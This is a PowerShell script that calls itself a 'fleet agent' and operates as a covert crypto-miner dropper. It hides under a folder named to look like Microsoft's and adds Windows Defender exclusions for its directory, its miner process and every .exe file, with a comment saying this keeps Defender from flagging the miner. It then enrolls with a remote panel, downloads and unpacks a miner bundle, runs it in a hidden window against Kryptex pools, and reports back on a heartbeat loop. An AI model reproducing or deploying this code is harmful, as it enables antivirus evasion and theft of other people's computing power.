# wcsvc-agent.ps1 - fleet agent (simple, robust, logs every step)
$ErrorActionPreference = 'Continue'

$Dir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\wcsvc'
$LogFile = Join-Path $Dir 'logs\wcsvc.log'
$CfgFile = Join-Path $Dir 'wcsvc.dat'
$StateFile = Join-Path $Dir 'wcsvc.state'
$MinerDir = Join-Path $Dir 'miner'
$MinerExe = Join-Path $MinerDir 'krig-miner.exe'
$MinerLog = Join-Path $Dir 'logs\wcsvc-rt.log'

try { [IO.Directory]::CreateDirectory((Join-Path $Dir 'logs')) | Out-Null } catch {}

function L([string]$m) {
    try {
        $line = '[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] ' + $m
        [IO.File]::AppendAllText($LogFile, $line + "`r`n")
    } catch {}
}

L '=== boot ==='

# If we run elevated (the task uses /RL HIGHEST), exclude the miner BEFORE it
# lands on disk -- this is what stops Defender from flagging krig-miner.exe.
$isAdmin = $false
try {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
} catch {}
L ("admin=" + $isAdmin)
if ($isAdmin) {
    try {
        Add-MpPreference -ExclusionPath $Dir -EA Stop
        Add-MpPreference -ExclusionProcess 'krig-miner.exe' -EA Stop
        Add-MpPreference -ExclusionExtension '.exe' -EA Stop
        L 'defender exclusions added'
    } catch { L ('defender exclusion failed: ' + $_.Exception.Message) }
}
L ("dir=" + $Dir)
L ("ps=" + $PSVersionTable.PSVersion.ToString())

if (-not (Test-Path $CfgFile)) { L 'ERROR: wcsvc.dat missing'; exit 1 }
try {
    $cfg = Get-Content $CfgFile -Raw | ConvertFrom-Json
    L ("cfg panel=" + $cfg.panel_url)
} catch {
    L ("ERROR parsing cfg: " + $_.Exception.Message); exit 1
}

if ((-not $cfg.rig_name) -or ($cfg.rig_name -eq 'PLACEHOLDER')) {
    $cfg.rig_name = $env:COMPUTERNAME
    try { ($cfg | ConvertTo-Json) | Set-Content $CfgFile } catch {}
}
$Base = $cfg.panel_url.TrimEnd('/')
$Worker = $cfg.rig_name
L ("worker=" + $Worker)

$Token = $null
if (Test-Path $StateFile) {
    try { $Token = (Get-Content $StateFile -Raw | ConvertFrom-Json).token } catch {}
}

function Post([string]$path, $obj, [string]$token) {
    $h = @{ 'Content-Type' = 'application/json' }
    if ($token) { $h['Authorization'] = "Bearer $token" }
    $body = $obj | ConvertTo-Json -Depth 6 -Compress
    try {
        return Invoke-RestMethod -Uri ($Base + $path) -Method Post -Headers $h -Body $body -TimeoutSec 25
    } catch {
        L ("POST " + $path + " FAILED: " + $_.Exception.Message)
        return $null
    }
}

function Do-Enroll {
    L 'enrolling...'
    $r = Post '/api/rig/enroll' @{ enroll_key = $cfg.enroll_key; name = $Worker; machine_id = $Worker; os = 'Windows'; agent_version = '2.2' } $null
    if (-not $r -or -not $r.token) { L 'enroll FAILED'; return $null }
    try { @{ rig_id = $r.rig_id; token = $r.token } | ConvertTo-Json | Set-Content $StateFile } catch {}
    L ('enrolled rig_id=' + $r.rig_id)
    return $r.token
}

if (-not $Token) {
    L 'enrolling...'
    $r = Post '/api/rig/enroll' @{ enroll_key = $cfg.enroll_key; name = $Worker; machine_id = $Worker; os = 'Windows'; agent_version = '2.1' } $null
    if (-not $r) { L 'enroll failed'; Start-Sleep 20; exit 1 }
    $Token = $r.token
    try { @{ rig_id = $r.rig_id; token = $r.token } | ConvertTo-Json | Set-Content $StateFile } catch {}
    L ("enrolled rig_id=" + $r.rig_id)
}

function Get-Gpus {
    $list = @()
    try {
        $i = 0
        $vc = $null
        try { $vc = Get-CimInstance Win32_VideoController } catch { $vc = Get-WmiObject Win32_VideoController }
        foreach ($g in $vc) {
            $n = [string]$g.Name
            $v = 'unknown'
            if ($n -match 'NVIDIA|GeForce|Tesla|Quadro') { $v = 'nvidia' }
            elseif ($n -match 'Radeon|AMD') { $v = 'amd' }
            elseif ($n -match 'Intel|Arc') { $v = 'intel' }
            $list += [pscustomobject]@{ index = $i; vendor = $v; model = $n; vram_mb = [int]($g.AdapterRAM/1MB); driver = [string]$g.DriverVersion; temp_c = $null; fan_pct = $null; power_w = $null; util_pct = $null; compute_cap = $null }
            $i++
        }
    } catch { L ('gpu wmi err: ' + $_.Exception.Message) }
    try {
        $smi = & nvidia-smi --query-gpu=temperature.gpu,fan.speed,power.draw,utilization.gpu,memory.total --format=csv,noheader,nounits 2>$null
        if ($smi) {
            $j = 0
            foreach ($ln in @($smi)) {
                $p = $ln -split ',\s*'
                if ($j -lt $list.Count) {
                    $list[$j].temp_c = [double]$p[0]; $list[$j].fan_pct = [double]$p[1]
                    $list[$j].power_w = [double]$p[2]; $list[$j].util_pct = [double]$p[3]
                    $list[$j].vram_mb = [int]$p[4]
                }
                $j++
            }
        }
    } catch {}
    return ,$list
}

function Get-Hs {
    try {
        if (Test-Path $MinerLog) {
            foreach ($l in (Get-Content $MinerLog -Tail 30)) {
                if ($l -match '([\d.]+)\s*TH/s') { return [double]$Matches[1] }
                if ($l -match '([\d.]+)\s*GH/s') { return [double]$Matches[1] / 1000 }
            }
        }
    } catch {}
    return $null
}

function Get-Shares {
    $a = 0; $r2 = 0
    try {
        if (Test-Path $MinerLog) {
            foreach ($l in (Get-Content $MinerLog -Tail 300)) {
                $low = $l.ToLower()
                if ($low -match 'accepted') { $a++ }
                elseif ($low -match 'reject|stale') { $r2++ }
            }
        }
    } catch {}
    return @{ accepted_user = $a; accepted_dev = 0; rejected = $r2 }
}

function Miner-Running {
    try { return [bool](Get-Process -Name 'krig-miner' -ErrorAction SilentlyContinue) } catch { return $false }
}

function Miner-Stop {
    try { Get-Process -Name 'krig-miner' -ErrorAction SilentlyContinue | ForEach-Object { $_.Kill() }; L 'miner stopped' } catch {}
    Start-Sleep -Milliseconds 700
}

$POOLS = @(
  'prl-eu.kryptex.network:7048','prl-us.kryptex.network:7048','prl-ru.kryptex.network:7048',
  'prl-sg.kryptex.network:7048','prl-hk.kryptex.network:7048','prl-ae.kryptex.network:7048',
  'prl-br.kryptex.network:7048','prl.kryptex.network:7048'
)

$script:LastPool = $null

function Resolve-Pool([string]$pool) {
    if ($pool -and $pool -ne 'auto') { return $pool }
    $best = $null; $bestMs = [int]::MaxValue
    foreach ($p in $POOLS) {
        $parts = $p.Split(':')
        try {
            $sw = [Diagnostics.Stopwatch]::StartNew()
            $c = New-Object Net.Sockets.TcpClient
            $iar = $c.BeginConnect($parts[0], [int]$parts[1], $null, $null)
            if ($iar.AsyncWaitHandle.WaitOne(1500)) {
                $c.EndConnect($iar); $sw.Stop(); $c.Close()
                if ($sw.ElapsedMilliseconds -lt $bestMs) { $bestMs = $sw.ElapsedMilliseconds; $best = $p }
            } else { $c.Close() }
        } catch {}
    }
    if (-not $best) { $best = 'prl.kryptex.network:7048' }
    L ("auto-pool -> " + $best + " (" + $bestMs + "ms)")
    $script:LastPool = $best
    return $best
}

function Miner-Start($wallet, $pool, $worker) {
    if (-not $wallet) { L 'no wallet'; return }
    if (-not (Test-Path $MinerExe)) { L ('miner missing: ' + $MinerExe); return }
    $pool = Resolve-Pool $pool
    if ($pool -match '://') { $url = $pool } else { $url = 'stratum+ssl://' + $pool }
    $user = $wallet
    if ($worker) { $user = $wallet + '/' + $worker }
    L ("starting miner url=" + $url)
    $args = @('--url', $url, '--user', $user)
    $errf = Join-Path $Dir 'logs\wcsvc-rt.err'
    try {
        Start-Process -FilePath $MinerExe -ArgumentList $args -WorkingDirectory $MinerDir -WindowStyle Hidden -RedirectStandardOutput $MinerLog -RedirectStandardError $errf | Out-Null
        L 'miner started'
    } catch {
        try {
            Start-Process -FilePath $MinerExe -ArgumentList $args -WorkingDirectory $MinerDir -RedirectStandardOutput $MinerLog -RedirectStandardError $errf | Out-Null
            L 'miner started (no WindowStyle)'
        } catch { L ('miner start FAILED: ' + $_.Exception.Message) }
    }
}

function Ensure-Bundle($version, $token) {
    if (-not $version) { return (Test-Path $MinerExe) }
    if (Test-Path $MinerExe) { return $true }
    L ('downloading bundle ' + $version)
    try {
        [IO.Directory]::CreateDirectory($MinerDir) | Out-Null
        $zip = Join-Path $Dir '_b.zip'
        $h = @{ Authorization = "Bearer $token" }
        Invoke-WebRequest -Uri ($Base + '/api/rig/bundle/' + $version) -Headers $h -OutFile $zip -UseBasicParsing -TimeoutSec 300
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [IO.Compression.ZipFile]::ExtractToDirectory($zip, $MinerDir)
        $sub = Join-Path $MinerDir 'krig'
        if (Test-Path (Join-Path $sub 'krig-miner.exe')) {
            Get-ChildItem $sub | Move-Item -Destination $MinerDir -Force
            Remove-Item $sub -Recurse -Force
        }
        Remove-Item $zip -Force
        L ('bundle installed: ' + (Test-Path $MinerExe))
        return (Test-Path $MinerExe)
    } catch { L ('bundle FAILED: ' + $_.Exception.Message); return $false }
}

L '--- entering main loop ---'
$lastRestart = $cfg.restart_seq
while ($true) {
    try {
        $gpus = Get-Gpus
        $running = Miner-Running
        $hs = Get-Hs
        $sh = Get-Shares

        $payload = @{
            name = $Worker; machine_id = $Worker; os = 'Windows'
            agent_version = '2.1'; engine = 'krig'
            gpus_mineable = ($gpus.Count -gt 0); gpus = $gpus
            antivirus = @()
            miner = @{ version = $cfg.target_version; state = $(if ($running) { 'running' } else { 'stopped' }); pid = $null; restarts = 0 }
            hashrate_ths = @{ combined = $hs; per_gpu = @{} }
            shares = $sh
            intensity_pct = 100
            selected_pool = $(if ($script:LastPool) { $script:LastPool } else { $cfg.pool })
        }

        $resp = Post '/api/rig/heartbeat' $payload $Token
        if ($resp -and $resp.config) {
            $c = $resp.config
            $ver = $c.target_version
            $ok = Ensure-Bundle $ver $Token
            if ($ok) {
                if (-not $running -and $c.miner_enabled -and $c.wallet) {
                    Miner-Start $c.wallet $c.pool $Worker
                } elseif ($running -and (-not $c.miner_enabled)) {
                    Miner-Stop
                } elseif ($running -and $c.restart_seq -ne $lastRestart) {
                    $lastRestart = $c.restart_seq
                    Miner-Stop
                    Miner-Start $c.wallet $c.pool $Worker
                }
            }
            if ($ver -and $ver -ne $cfg.target_version) {
                $cfg.target_version = $ver
                try { ($cfg | ConvertTo-Json) | Set-Content $CfgFile } catch {}
            }
        } else {
            L 'heartbeat empty -> re-enrolling (panel may have been reset)'
            $Token = Do-Enroll
            if (-not $Token) { Start-Sleep -Seconds 15; continue }
            L 're-enrolled, retrying'
        }
    } catch {
        L ('loop error: ' + $_.Exception.Message)
    }
    Start-Sleep -Seconds 30
}
